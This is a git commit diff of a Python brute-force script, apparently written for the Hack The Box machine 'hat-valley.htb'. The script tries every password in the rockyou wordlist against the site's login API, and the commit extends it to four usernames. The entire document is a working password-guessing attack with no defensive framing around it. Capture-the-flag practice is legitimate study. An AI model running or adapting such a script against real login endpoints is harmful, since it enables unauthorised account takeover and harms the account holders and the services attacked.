d20752246ee4c281f3eee4b428022a9b18fe9cc6
quoije <mathieumoran1@gmail.com>
2022-10-26 04:43:59 -0400

    up

--- quickBF4HTB.py
+++ quickBF4HTB.py
@@ -2,7 +2,7 @@ from requests import post
 import time
 
 wordlist = "/usr/share/wordlists/rockyou.txt"
-usern = "bean.hill"
+usrn = ["bean.hill", "christine.wool", "christopher.jones", "jackson.lightheart"]
 
 def ayy(username, password):
         endpoint = "http://hat-valley.htb/api/login"
@@ -20,11 +20,12 @@ with open(wordlist,'r') as mariob:
     for passWL in mariob:
 					if found == False:
 						for pasw in passWL.split():
-							print("[+++] testing " + usern + ":" + pasw)
-							if ayy(usern, pasw) == "Incorrect username or password":
-								print("[+] Found?: " + str(found))
-								time.sleep(.01)
-							else:
-								found = True
-								print("[+] Found?: " + str(found) + " | password: " + pasw)
+							for usernames in usrn:
+								print("[+++] testing " + usernames + ":" + pasw)
+								if ayy(usernames, pasw) == "Incorrect username or password":
+									print("[+] Found?: " + str(found))
+									time.sleep(.01)
+								else:
+									found = True
+									print("[+] Found?: " + str(found) + " | password: " + pasw)
 					else: exit()
